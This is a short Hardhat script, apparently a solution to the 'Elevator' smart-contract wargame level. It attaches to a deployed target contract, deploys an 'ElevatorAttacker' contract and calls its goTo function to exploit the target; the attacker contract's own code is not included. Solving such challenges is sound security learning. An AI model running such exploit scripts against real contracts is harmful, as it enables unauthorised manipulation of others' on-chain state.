import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xBBa6bc879d38395b7bcb5114dB63ba26C197A965";
const CONTRACT_NAME = "Elevator";
const ATTACKER_NAME = "ElevatorAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerContractFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerContractFactory.deploy();
  await attackerContract.deployed();

  const tx = await attackerContract.goTo(1, contract.address);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
